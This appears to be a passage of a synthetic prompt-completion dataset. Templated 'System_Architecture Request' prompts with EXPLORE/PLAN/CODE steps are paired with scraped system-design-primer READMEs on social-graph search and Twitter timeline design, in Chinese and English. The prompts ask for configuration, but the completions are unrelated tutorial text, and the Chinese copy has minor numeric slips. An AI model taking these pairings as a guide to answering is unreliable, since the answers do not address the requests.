person data can be served from a **Memory Cache** such as Redis or Memcached to reduce response times and to reduce traffic to downstream services.  This could be especially useful for people who do multiple searches in succession and for people who are well-connected.  Reading 1 MB sequentially from memory takes about 250 microseconds, while reading from SSD takes 4x and from disk takes 80x longer.<sup><a href=https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know>1</a></sup>\n\nBelow are further optimizations:\n\n* Store complete or partial BFS traversals to speed up subsequent lookups in the **Memory Cache**\n* Batch compute offline then store complete or partial BFS traversals to speed up subsequent lookups in a **NoSQL Database**\n* Reduce machine jumps by batching together friend lookups hosted on the same **Person Server**\n    * [Shard](https://github.com/donnemartin/system-design-primer#sharding) **Person Servers** by location to further improve this, as friends generally live closer to each other\n* Do two BFS searches at the same time, one starting from the source, and one from the destination, then merge the two paths\n* Start the BFS search from people with large numbers of friends, as they are more likely to reduce the number of [degrees of separation](https://en.wikipedia.org/wiki/Six_degrees_of_separation) between the current user and the search target\n* Set a limit based on time or number of hops before asking the user if they want to continue searching, as searching could take a considerable amount of time in some cases\n* Use a **Graph Database** such as [Neo4j](https://neo4j.com/) or a graph-specific query language such as [GraphQL](http://graphql.org/) (if there were no constraint preventing the use of **Graph Databases**)\n\n## Additional talking points\n\n> Additional topics to dive into, depending on the problem scope and time remaining.\n\n### SQL scaling patterns\n\n* [Read replicas](https://github.com/donnemartin/system-design-primer#master-slave-replication)\n* [Federation](https://github.com/donnemartin/system-design-primer#federation)\n* [Sharding](https://github.com/donnemartin/system-design-primer#sharding)\n* [Denormalization](https://github.com/donnemartin/system-design-primer#denormalization)\n* [SQL Tuning](https://github.com/donnemartin/system-design-primer#sql-tuning)\n\n#### NoSQL\n\n* [Key-value store](https://github.com/donnemartin/system-design-primer#key-value-store)\n* [Document store](https://github.com/donnemartin/system-design-primer#document-store)\n* [Wide column store](https://github.com/donnemartin/system-design-primer#wide-column-store)\n* [Graph database](https://github.com/donnemartin/system-design-primer#graph-database)\n* [SQL vs NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql)\n\n### Caching\n\n* Where to cache\n    * [Client caching](https://github.com/donnemartin/system-design-primer#client-caching)\n    * [CDN caching](https://github.com/donnemartin/system-design-primer#cdn-caching)\n    * [Web server caching](https://github.com/donnemartin/system-design-primer#web-server-caching)\n    * [Database caching](https://github.com/donnemartin/system-design-primer#database-caching)\n    * [Application caching](https://github.com/donnemartin/system-design-primer#application-caching)\n* What to cache\n    * [Caching at the database query level](https://github.com/donnemartin/system-design-primer#caching-at-the-database-query-level)\n    * [Caching at the object level](https://github.com/donnemartin/system-design-primer#caching-at-the-object-level)\n* When to update the cache\n    * [Cache-aside](https://github.com/donnemartin/system-design-primer#cache-aside)\n    * [Write-through](https://github.com/donnemartin/system-design-primer#write-through)\n    * [Write-behind (write-back)](https://github.com/donnemartin/system-design-primer#write-behind-write-back)\n    * [Refresh ahead](https://github.com/donnemartin/system-design-primer#refresh-ahead)\n\n### Asynchronism and microservices\n\n* [Message queues](https://github.com/donnemartin/system-design-primer#message-queues)\n* [Task queues](https://github.com/donnemartin/system-design-primer#task-queues)\n* [Back pressure](https://github.com/donnemartin/system-design-primer#back-pressure)\n* [Microservices](https://github.com/donnemartin/system-design-primer#microservices)\n\n### Communications\n\n* Discuss tradeoffs:\n    * External communication with clients - [HTTP APIs following REST](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest)\n    * Internal communications - [RPC](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc)\n* [Service discovery](https://github.com/donnemartin/system-design-primer#service-discovery)\n\n### Security\n\nRefer to the [security section](https://github.com/donnemartin/system-design-primer#security).\n\n### Latency numbers\n\nSee [Latency numbers every programmer should know](https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know).\n\n### Ongoing\n\n* Continue benchmarking and monitoring your system to address bottlenecks as they come up\n* Scaling is an iterative process\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/social_graph/README.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.92, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 350}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# 设计推特时间轴与搜索功能\n\n**注意：这个文档中的链接会直接指向[系统设计主题索引](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#系统设计主题的索引)中的有关部分，以避免重复的内容。你可以参考链接的相关内容，来了解其总的要点、方案的权衡取舍以及可选的替代方案。**\n\n**设计 Facebook 的 feed** 与**设计 Facebook 搜索**与此为同一类型问题。\n\n## 第一步：简述用例与约束条件\n\n> 搜集需求与问题的范围。\n> 提出问题来明确用例与约束条件。\n> 讨论假设。\n\n我们将在没有面试官明确说明问题的情况下，自己定义一些用例以及限制条件。\n\n### 用例\n\n#### 我们将把问题限定在仅处理以下用例的范围中\n\n* **用户**发布了一篇推特\n    * **服务**将推特推送给关注者，给他们发送消息通知与邮件\n* **用户**浏览用户时间轴（用户最近的活动）\n* **用户**浏览主页时间轴（用户关注的人最近的活动）\n* **用户**搜索关键词\n* **服务**需要有高可用性\n\n#### 不在用例范围内的有\n\n* **服务**向 Firehose 与其它流数据接口推送推特\n* **服务**根据用户的”是否可见“选项排除推特\n    * 隐藏未关注者的 @回复\n    * 关心”隐藏转发“设置\n* 数据分析\n\n### 限制条件与假设\n\n#### 提出假设\n\n普遍情况\n\n* 网络流量不是均匀分布的\n* 发布推特的速度需要足够快速\n    * 除非有上百万的关注者，否则将推特推送给粉丝的速度要足够快\n* 1 亿个活跃用户\n* 每天新发布 5 亿条推特，每月新发布 150 亿条推特\n    * 平均每条推特需要推送给 5 个人\n    * 每天需要进行 50 亿次推送\n    * 每月需要进行 1500 亿次推送\n* 每月需要处理 2500 亿次读取请求\n* 每月需要处理 100 亿次搜索\n\n时间轴功能\n\n* 浏览时间轴需要足够快\n* 推特的读取负载要大于写入负载\n    * 需要为推特的快速读取进行优化\n* 存入推特是高写入负载功能\n\n搜索功能\n\n* 搜索速度需要足够快\n* 搜索是高负载读取功能\n\n#### 计算用量\n\n**如果你需要进行粗略的用量计算，请向你的面试官说明。**\n\n* 每条推特的大小：\n    * `tweet_id` - 8 字节\n    * `user_id` - 32 字节\n    * `text` - 140 字节\n    * `media` - 平均 10 KB\n    * 总计： 大约 10 KB\n* 每月产生新推特的内容为 150 TB\n    * 每条推特 10 KB  * 每天 5 亿条推特 * 每月 30 天\n    * 3 年产生新推特的内容为 5.4 PB\n* 每秒需要处理 10 万次读取请求\n    * 每个月需要处理 2500 亿次请求 * (每秒 400 次请求 / 每月 10 亿次请求)\n* 每秒发布 6000 条推特\n    * 每月发布 150 亿条推特 * (每秒 400 次请求 / 每月 10 次请求)\n* 每秒推送 6 万条推特\n    * 每月推送 1500 亿条推特 * (每秒 400 次请求 / 每月 10 亿次请求)\n* 每秒 4000 次搜索请求\n\n便利换算指南：\n\n* 每个月有 250 万秒\n* 每秒一个请求 = 每个月 250 万次请求\n* 每秒 40 个请求 = 每个月 1 亿次请求\n* 每秒 400 个请求 = 每个月 10 亿次请求\n\n## 第二步：概要设计\n\n> 列出所有重要组件以规划概要设计。\n\n![Imgur](http://i.imgur.com/48tEA2j.png)\n\n## 第三步：设计核心组件\n\n> 深入每个核心组件的细节。\n\n### 用例：用户发表了一篇推特\n\n我们可以将用户自己发表的推特存储在[关系数据库](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms)中。我们也可以讨论一下[究竟是用 SQL 还是用 NoSQL](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#sql-还是-nosql)。\n\n构建用户主页时间轴（查看关注用户的活动）以及推送推特是件麻烦事。将特推传播给所有关注者（每秒约递送 6 万条推特）这一操作有可能会使传统的[关系数据库](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms)超负载。因此，我们可以使用 **NoSQL 数据库**或**内存数据库**之类的更快的数据存储方式。从内存读取 1 MB 连续数据大约要花 250 微秒，而从 SSD 读取同样大小的数据要花费 4 倍的时间，从机械硬盘读取需要花费 80 倍以上的时间。<sup><a href=https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#每个程序员都应该知道的延迟数>1</a></sup>\n\n我们可以将照片、视频之类的媒体存储于**对象存储**中。\n\n* **客户端**向应用[反向代理](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)的**Web 服务器**发送一条推特\n* **Web 服务器**将请求转发给**写 API**服务器\n* **写 API**服务器将推特使用 **SQL 数据库**存储于用户时间轴中\n* **写 API**调用**消息输出服务**，进行以下操作：\n    * 查询**用户 图 服务**找到存储于**内存缓存**中的此用户的粉丝\n    * 将推特存储于**内存缓存**中的**此用户的粉丝的主页时间轴**中\n        * O(n) 复杂度操作：  1000 名粉丝 = 1000 次查找与插入\n    * 将特推存储在**搜索索引服务**中，以加快搜索\n    * 将媒体存储于**对象存储**中\n    * 使用**通知服务**向粉丝发送推送：\n        * 使用**队列**异步推送通知\n\n**向你的面试官告知你准备写多少代码**。\n\n如果我们用 Redis 作为**内存缓存**，那可以用 Redis 原生的 list 作为其数据结构。结构如下：\n\n```\n           tweet n+2                   tweet n+1                   tweet n\n| 8 bytes   8 bytes  1 byte | 8 bytes   8 bytes  1 byte | 8 bytes   8 bytes  1 byte |\n| tweet_id  user_id  meta   | tweet_id  user_id  meta   | tweet_id  user_id  meta   |\n```\n\n新发布的推特将被存储在对应用户（关注且活跃的用户）的主页时间轴的**内存缓存**中。\n\n我们可以调用一个公共的 [REST API](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#表述性状态转移rest)：\n\n```\n$ curl -X POST --data '{ \"user_id\": \"123\", \"auth_token\": \"ABC123\", \\\n    \"status\": \"hello world!\", \"media_ids\": \"ABC987\" }' \\\n    https://twitter.com/api/v1/tweet\n```\n\n返回：\n\n```\n{\n    \"created_at\": \"Wed Sep 05 00:37:15 +0000 2012\",\n    \"status\": \"hello world!\",\n    \"tweet_id\": \"987\",\n    \"user_id\": \"123\",\n    ...\n}\n```\n\n而对于服务器内部的通信，我们可以使用 [RPC](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#远程过程调用协议rpc)。\n\n### 用例：用户浏览主页时间轴\n\n* **客户端**向 **Web 服务器**发起一次读取主页时间轴的请求\n* **Web 服务器**将请求转发给**读取 API**服务器\n* **读取 API**服务器调用**时间轴服务**进行以下操作：\n    * 从**内存缓存**读取时间轴数据，其中包括推特 id 与用户 id - O(1)\n    * 通过 [multiget](http://redis.io/commands/mget) 向**推特信息服务**进行查询，以获取相关 id 推特的额外信息 - O(n)\n    * 通过 muiltiget 向**用户信息服务**进行查询，以获取相关 id 用户的额外信息 - O(n)\n\nREST API：\n\n```\n$ curl https://twitter.com/api/v1/home_timeline?user_id=123\n```\n\n返回：\n\n```\n{\n    \"user_id\": \"456\",\n    \"tweet_id\": \"123\",\n    \"status\": \"foo\"\n},\n{\n    \"user_id\": \"789\",\n    \"tweet_id\": \"456\",\n    \"status\": \"bar\"\n},\n{\n    \"user_id\": \"789\",\n    \"tweet_id\": \"579\",\n    \"status\": \"baz\"\n},\n```\n\n### 用例：用户浏览用户时间轴\n\n* **客户端**向**Web 服务器**发起获得用户时间线的请求\n* **Web 服务器**将请求转发给**读取 API**服务器\n* **读取 API**从 **SQL 数据库**中取出用户的时间轴\n\nREST API 与前面的主页时间轴类似，区别只在于取出的推特是由用户自己发送而不是关注人发送。\n\n### 用例：用户搜索关键词\n\n* **客户端**将搜索请求发给**Web 服务器**\n* **Web 服务器**将请求转发给**搜索 API**服务器\n* **搜索 API**调用**搜索服务**进行以下操作：\n    * 对输入进行转换与分词，弄明白需要搜索什么东西\n        * 移除标点等额外内容\n        * 将文本打散为词组\n        * 修正拼写错误\n        * 规范字母大小写\n        * 将查询转换为布尔操作\n    * 查询**搜索集群**（例如[Lucene](https://lucene.apache.org/)）检索结果：\n        * 对集群内的所有服务器进行查询，将有结果的查询进行[发散聚合（Scatter gathers）](https://github.com/donnemartin/system-design-primer#under-development)\n        * 合并取到的条目，进行评分与排序，最终返回结果\n\nREST API：\n\n```\n$ curl https://twitter.com/api/v1/search?query=hello+world\n```\n\n返回结果与前面的主页时间轴类似，只不过返回的是符合查询条件的推特。\n\n## 第四步：架构扩展\n\n> 根据限制条件，找到并解决瓶颈。\n\n![Imgur](http://i.imgur.com/MzExP06.png)\n\n**重要提示：不要从最初设计直接跳到最终设计中！**\n\n现在你要 1) **基准测试、负载测试**。2) **分析、描述**性能瓶颈。3) 在解决瓶颈问题的同时，评估替代方案、权衡利弊。4) 重复以上步骤。请阅读[「设计一个系统，并将其扩大到为数以百万计的 AWS 用户服务」](../scaling_aws/README.md) 来了解如何逐步扩大初始设计。\n\n讨论初始设计可能遇到的瓶颈及相关解决方案是很重要的。例如加上一个配置多台 **Web 服务器**的**负载均衡器**是否能够解决问题？**CDN**呢？**主从复制**呢？它们各自的替代方案和需要**权衡**的利弊又有什么呢？\n\n我们将会介绍一些组件来完成设计，并解决架构扩张问题。内置的负载均衡器将不做讨论以节省篇幅。\n\n**为了避免重复讨论**，请参考[系统设计主题索引](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#系统设计主题的索引)相关部分来了解其要点、方案的权衡取舍以及可选的替代方案。\n\n* [DNS](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#域名系统)\n* [负载均衡器](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#负载均衡器)\n* [水平拓展](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#水平扩展)\n* [反向代理（web 服务器）](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#反向代理web-服务器)\n* [API 服务（应用层）](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#应用层)\n* [缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#缓存)\n* [关系型数据库管理系统 (RDBMS)](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#关系型数据库管理系统rdbms)\n* [SQL 故障主从切换](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#故障切换)\n* [主从复制](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#主从复制)\n* [一致性模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#一致性模式)\n* [可用性模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#可用性模式)\n\n**消息输出服务**有可能成为性能瓶颈。那些有着百万数量关注着的用户可能发一条推特就需要好几分钟才能完成消息输出进程。这有可能使 @回复 这种推特时出现竞争条件，因此需要根据服务时间对此推特进行重排序来降低影响。\n\n我们还可以避免从高关注量的用户输出推特。相反，我们可以通过搜索来找到高关注量用户的推特，并将搜索结果与用户的主页时间轴合并，再根据时间对其进行排序。\n\n此外，还可以通过以下内容进行优化：\n\n* 仅为每个主页时间轴在**内存缓存**中存储数百条推特\n* 仅在**内存缓存**中存储活动用户的主页时间轴\n    * 如果某个用户在过去 30 天都没有产生活动，那我们可以使用 **SQL 数据库**重新构建他的时间轴\n        * 使用**用户 图 服务**来查询并确定用户关注的人\n        * 从 **SQL 数据库**中取出推特，并将它们存入**内存缓存**\n* 仅在**推特信息服务**中存储一个月的推特\n* 仅在**用户信息服务**中存储活动用户的信息\n* **搜索集群**需要将推特保留在内存中，以降低延迟\n\n我们还可以考虑优化 **SQL 数据库** 来解决一些瓶颈问题。\n\n**内存缓存**能减小一些数据库的负载，靠 **SQL Read 副本**已经足够处理缓存未命中情况。我们还可以考虑使用一些额外的 SQL 性能拓展技术。\n\n高容量的写入将淹没单个的 **SQL 写主从**模式，因此需要更多的拓展技术。\n\n* [联合](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#联合)\n* [分片](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#分片)\n* [非规范化](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#非规范化)\n* [SQL 调优](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#sql-调优)\n\n我们也可以考虑将一些数据移至 **NoSQL 数据库**。\n\n## 其它要点\n\n> 是否深入这些额外的主题，取决于你的问题范围和剩下的时间。\n\n#### NoSQL\n\n* [键-值存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#键-值存储)\n* [文档类型存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#文档类型存储)\n* [列型存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#列型存储)\n* [图数据库](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#图数据库)\n* [SQL vs NoSQL](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#sql-还是-nosql)\n\n### 缓存\n\n* 在哪缓存\n    * [客户端缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#客户端缓存)\n    * [CDN 缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#cdn-缓存)\n    * [Web 服务器缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#web-服务器缓存)\n    * [数据库缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#数据库缓存)\n    * [应用缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#应用缓存)\n* 什么需要缓存\n    * [数据库查询级别的缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#数据库查询级别的缓存)\n    * [对象级别的缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#对象级别的缓存)\n* 何时更新缓存\n    * [缓存模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#缓存模式)\n    * [直写模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#直写模式)\n    * [回写模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#回写模式)\n    * [刷新](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#刷新)\n\n### 异步与微服务\n\n* [消息队列](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#消息队列)\n* [任务队列](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#任务队列)\n* [背压](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#背压)\n* [微服务](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#微服务)\n\n### 通信\n\n* 可权衡选择的方案：\n    * 与客户端的外部通信 - [使用 REST 作为 HTTP API](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#表述性状态转移rest)\n    * 服务器内部通信 - [RPC](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#远程过程调用协议rpc)\n* [服务发现](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#服务发现)\n\n### 安全性\n\n请参阅[「安全」](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#安全)一章。\n\n### 延迟数值\n\n请参阅[「每个程序员都应该知道的延迟数」](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#每个程序员都应该知道的延迟数)。\n\n### 持续探讨\n\n* 持续进行基准测试并监控你的系统，以解决他们提出的瓶颈问题。\n* 架构拓展是一个迭代的过程。\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/twitter/README-zh-Hans.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 332}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Design the Twitter timeline and search\n\n*Note: This document links directly to relevant areas found in the [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) to avoid duplication.  Refer to the linked content for general talking points, tradeoffs, and alternatives.*\n\n**Design the Facebook feed** and **Design Facebook search** are similar questions.\n\n## Step 1: Outline use cases and constraints\n\n> Gather requirements and scope the problem.\n> Ask questions to clarify use cases and constraints.\n> Discuss assumptions.\n\nWithout an interviewer to address clarifying questions, we'll define some use cases and constraints.\n\n### Use cases\n\n#### We'll scope the problem to handle only the following use cases\n\n* **User** posts a tweet\n    * **Service** pushes tweets to followers, sending push notifications and emails\n* **User** views the user timeline (activity from the user)\n* **User** views the home timeline (activity from people the user is following)\n* **User** searches keywords\n* **Service** has high availability\n\n#### Out of scope\n\n* **Service** pushes tweets to the Twitter Firehose and other streams\n* **Service** strips out tweets based on users' visibility settings\n    * Hide @reply if the user is not also following the person being replied to\n    * Respect 'hide retweets' setting\n* Analytics\n\n### Constraints and assumptions\n\n#### State assumptions\n\nGeneral\n\n* Traffic is not evenly distributed\n* Posting a tweet should be fast\n    * Fanning out a tweet to all of your followers should be fast, unless you have millions of followers\n* 100 million active users\n* 500 million tweets per day or 15 billion tweets per month\n    * Each tweet averages a fanout of 10 deliveries\n    * 5 billion total tweets delivered on fanout per day\n    * 150 billion tweets delivered on fanout per month\n* 250 billion read requests per month\n* 10 billion searches per month\n\nTimeline\n\n* Viewing the timeline should be fast\n* Twitter is more read heavy than write heavy\n    * Optimize for fast reads of tweets\n* Ingesting tweets is write heavy\n\nSearch\n\n* Searching should be fast\n* Search is read-heavy\n\n#### Calculate usage\n\n**Clarify with your interviewer if you should run back-of-the-envelope usage calculations.**\n\n* Size per tweet:\n    * `tweet_id` - 8 bytes\n    * `user_id` - 32 bytes\n    * `text` - 140 bytes\n    * `media` - 10 KB average\n    * Total: ~10 KB\n* 150 TB of new tweet content per month\n    * 10 KB per tweet * 500 million tweets per day * 30 days per month\n    * 5.4 PB of new tweet content in 3 years\n* 100 thousand read requests per second\n    * 250 billion read requests per month * (400 requests per second / 1 billion requests per month)\n* 6,000 tweets per second\n    * 15 billion tweets per month * (400 requests per second / 1 billion requests per month)\n* 60 thousand tweets delivered on fanout per second\n    * 150 billion tweets delivered on fanout per month * (400 requests per second / 1 billion requests per month)\n* 4,000 search requests per second\n    * 10 billion searches per month * (400 requests per second / 1 billion requests per month)\n\nHandy conversion guide:\n\n* 2.5 million seconds per month\n* 1 request per second = 2.5 million requests per month\n* 40 requests per second = 100 million requests per month\n* 400 requests per second = 1 billion requests per month\n\n## Step 2: Create a high level design\n\n> Outline a high level design with all important components.\n\n![Imgur](http://i.imgur.com/48tEA2j.png)\n\n## Step 3: Design core components\n\n> Dive into details for each core component.\n\n### Use case: User posts a tweet\n\nWe could store the user's own tweets to populate the user timeline (activity from the user) in a [relational database](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms).  We should discuss the [use cases and tradeoffs between choosing SQL or NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql).\n\nDelivering tweets and building the home timeline (activity from people the user is following) is trickier.  Fanning out tweets to all followers (60 thousand tweets delivered on fanout per second) will overload a traditional [relational database](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms).  We'll probably want to choose a data store with fast writes such as a **NoSQL database** or **Memory Cache**.  Reading 1 MB sequentially from memory takes about 250 microseconds, while reading from SSD takes 4x and from disk takes 80x longer.<sup><a href=https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know>1</a></sup>\n\nWe could store media such as photos or videos on an **Object Store**.\n\n* The **Client** posts a tweet to the **Web Server**, running as a [reverse proxy](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* The **Web Server** forwards the request to the **Write API** server\n* The **Write API** stores the tweet in the user's timeline on a **SQL database**\n* The **Write API** contacts the **Fan Out Service**, which does the following:\n    * Queries the **User Graph Service** to find the user's followers stored in the **Memory Cache**\n    * Stores the tweet in the *home timeline of the user's followers* in a **Memory Cache**\n        * O(n) operation:  1,000 followers = 1,000 lookups and inserts\n    * Stores the tweet in the **Search Index Service** to enable fast searching\n    * Stores media in the **Object Store**\n    * Uses the **Notification Service** to send out push notifications to followers:\n        * Uses a **Queue** (not pictured) to asynchronously send out notifications\n\n**Clarify with your interviewer how much code you are expected to write**.\n\nIf our **Memory Cache** is Redis, we could use a native Redis list with the following structure:\n\n```\n           tweet n+2                   tweet n+1                   tweet n\n| 8 bytes   8 bytes  1 byte | 8 bytes   8 bytes  1 byte | 8 bytes   8 bytes  1 byte |\n| tweet_id  user_id  meta   | tweet_id  user_id  meta   | tweet_id  user_id  meta   |\n```\n\nThe new tweet would be placed in the **Memory Cache**, which populates the user's home timeline (activity from people the user is following).\n\nWe'll use a public [**REST API**](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest):\n\n```\n$ curl -X POST --data '{ \"user_id\": \"123\", \"auth_token\": \"ABC123\", \\\n    \"status\": \"hello world!\", \"media_ids\": \"ABC987\" }' \\\n    https://twitter.com/api/v1/tweet\n```\n\nResponse:\n\n```\n{\n    \"created_at\": \"Wed Sep 05 00:37:15 +0000 2012\",\n    \"status\": \"hello world!\",\n    \"tweet_id\": \"987\",\n    \"user_id\": \"123\",\n    ...\n}\n```\n\nFor internal communications, we could use [Remote Procedure Calls](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc).\n\n### Use case: User views the home timeline\n\n* The **Client** posts a home timeline request to the **Web Server**\n* The **Web Server** forwards the request to the **Read API** server\n* The **Read API** server contacts the **Timeline Service**, which does the following:\n    * Gets the timeline data stored in the **Memory Cache**, containing tweet ids and user ids - O(1)\n    * Queries the **Tweet Info Service** with a [multiget](http://redis.io/commands/mget) to obtain additional info about the tweet ids - O(n)\n    * Queries the **User Info Service** with a multiget to obtain additional info about the user ids - O(n)\n\nREST API:\n\n```\n$ curl https://twitter.com/api/v1/home_timeline?user_id=123\n```\n\nResponse:\n\n```\n{\n    \"user_id\": \"456\",\n    \"tweet_id\": \"123\",\n    \"status\": \"foo\"\n},\n{\n    \"user_id\": \"789\",\n    \"tweet_id\": \"456\",\n    \"status\": \"bar\"\n},\n{\n    \"user_id\": \"789\",\n    \"tweet_id\": \"579\",\n    \"status\": \"baz\"\n},\n```\n\n### Use case: User views the user timeline\n\n* The **Client** posts a user timeline request to the **Web Server**\n* The **Web Server** forwards the request to the **Read API** server\n* The **Read API** retrieves the user timeline from the **SQL Database**\n\nThe REST API would be similar to the home timeline, except all tweets would come from the user as opposed to the people the user is following.\n\n### Use case: User searches keywords\n\n* The **Client** sends a search request to the **Web Server**\n* The **Web Server** forwards the request to the **Search API** server\n* The **Search API** contacts the **Search Service**, which does the following:\n    * Parses/tokenizes the input query, determining what needs to be searched\n        * Removes markup\n        * Breaks up the text into terms\n        * Fixes typos\n        * Normalizes capitalization\n        * Converts the query to use boolean operations\n    * Queries the **Search Cluster** (ie [Lucene](https://lucene.apache.org/)) for the results:\n        * [Scatter gathers](https://github.com/donnemartin/system-design-primer#under-development) each server in the cluster to determine if there are any results for the query\n        * Merges, ranks, sorts, and returns the results\n\nREST API:\n\n```\n$ curl https://twitter.com/api/v1/search?query=hello+world\n```\n\nThe response would be similar to that of the home timeline, except for tweets matching the given query.\n\n## Step 4: Scale the design\n\n> Identify and address bottlenecks, given the constraints.\n\n![Imgur](http://i.imgur.com/jrUBAF7.png)\n\n**Important: Do not simply jump right into the final design from the initial design!**\n\nState you would 1) **Benchmark/Load Test**, 2) **Profile** for bottlenecks 3) address bottlenecks while evaluating alternatives and trade-offs, and 4) repeat.  See [Design a system that scales to millions of users on AWS](../scaling_aws/README.md) as a sample on how to iteratively scale the initial design.\n\nIt's important to discuss what bottlenecks you might encounter with the initial design and how you might address each of them.  For example, what issues are addressed by adding a **Load Balancer** with multiple **Web Servers**?  **CDN**?  **Master-Slave Replicas**?  What are the alternatives and **Trade-Offs** for each?\n\nWe'll introduce some components to complete the design and to address scalability issues.  Internal load balancers are not shown to reduce clutter.\n\n*To avoid repeating discussions*, refer to the following [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) for main talking points, tradeoffs, and alternatives:\n\n* [DNS](https://github.com/donnemartin/system-design-primer#domain-name-system)\n* [CDN](https://github.com/donnemartin/system-design-primer#content-delivery-network)\n* [Load balancer](https://github.com/donnemartin/system-design-primer#load-balancer)\n* [Horizontal scaling](https://github.com/donnemartin/system-design-primer#horizontal-scaling)\n* [Web server (reverse proxy)](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* [API server (application layer)](https://github.com/donnemartin/system-design-primer#application-layer)\n* [Cache](https://github.com/donnemartin/system-design-primer#cache)\n* [Relational database management system (RDBMS)](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms)\n* [SQL write master-slave failover](https://github.com/donnemartin/system-design-primer#fail-over)\n* [Master-slave replication](https://github.com/donnemartin/system-design-primer#master-slave-replication)\n* [Consistency patterns](https://github.com/donnemartin/system-design-primer#consistency-patterns)\n* [Availability patterns](https://github.com/donnemartin/system-design-primer#availability-patterns)\n\nThe **Fanout Service** is a potential bottleneck.  Twitter users with millions of followers could 